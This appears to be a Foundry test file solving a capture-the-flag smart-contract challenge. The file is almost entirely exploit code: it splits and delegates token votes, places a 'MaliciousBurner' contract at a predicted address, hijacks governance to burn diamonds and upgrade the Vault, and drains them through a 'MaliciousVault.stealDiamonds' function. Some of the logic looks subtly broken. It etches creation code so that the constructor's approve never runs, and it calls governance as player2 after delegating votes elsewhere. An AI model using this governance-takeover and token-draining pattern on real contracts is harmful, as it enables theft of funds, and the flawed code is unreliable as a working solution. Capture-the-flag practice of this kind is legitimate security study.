import "forge-std/Test.sol";
import "../src/Challenge.sol";
import "../src/Vault.sol";

contract ChallengeTest is Test {
    address player = makeAddr("player");
    address player2 = makeAddr("player2");
    Challenge chal;

    function setUp() public {
        vm.prank(player2);
        chal = new Challenge(msg.sender);
    }

  function testHack() public {
    // Step 1: Claim HEX tokens as player
    vm.startPrank(player);
    chal.claim();
    vm.stopPrank();

    // Step 2: Split HEX into 10 addresses
    for (uint256 i = 0; i < 10; i++) {
        address delegateAddr = address(uint160(uint256(keccak256(abi.encodePacked(i)))));
        
        // Transfer from player (temporary prank)
        vm.prank(player);
        chal.hexensCoin().transfer(delegateAddr, 1_000 ether);
        
        // Delegate from delegateAddr (temporary prank)
        vm.prank(delegateAddr);
        chal.hexensCoin().delegate(delegateAddr);
    }

    // Step 3: Predict Burner address
    address burnerAddr = computeBurnerAddress(address(chal.vault()));

    // Step 4: Deploy malicious Burner
    bytes memory code = abi.encodePacked(
        type(MaliciousBurner).creationCode, 
        abi.encode(address(chal.diamond()), player)
    );
    vm.etch(burnerAddr, code);

    // Step 5: Burn diamonds (call as player2 with sufficient votes)
    vm.prank(player2);
    chal.vault().governanceCall(
        abi.encodeWithSignature("burn(address,uint256)", address(chal.diamond()), chal.DIAMONDS())
    );

    // Step 6: Upgrade Vault
    MaliciousVault newVault = new MaliciousVault();
    vm.prank(player2);
    chal.vault().governanceCall(
        abi.encodeWithSignature("upgradeTo(address)", address(newVault))
    );

    // Step 7: Recover diamonds
    MaliciousVault(address(chal.vault())).stealDiamonds(burnerAddr, player);
    
    assertTrue(chal.isSolved(), "Diamonds not recovered!");
}
    // Helper to compute Burner address
    function computeBurnerAddress(address vaultAddr) internal pure returns (address) {
        bytes memory data = abi.encodePacked(bytes1(0xd6), bytes1(0x94), vaultAddr, bytes1(0x80));
        return address(uint160(uint256(keccak256(data))));
    }
}

// Malicious Burner (pre-approves player)
contract MaliciousBurner {
    constructor(address token, address player) {
        IERC20(token).approve(player, type(uint256).max);
    }
    function destruct() external { selfdestruct(payable(address(this))); }
}

// Malicious Vault (recovers diamonds)
contract MaliciousVault is Vault {
    function stealDiamonds(address burnerAddr, address to) external {
        IERC20(diamond).transferFrom(burnerAddr, to, IERC20(diamond).balanceOf(burnerAddr));
    }
}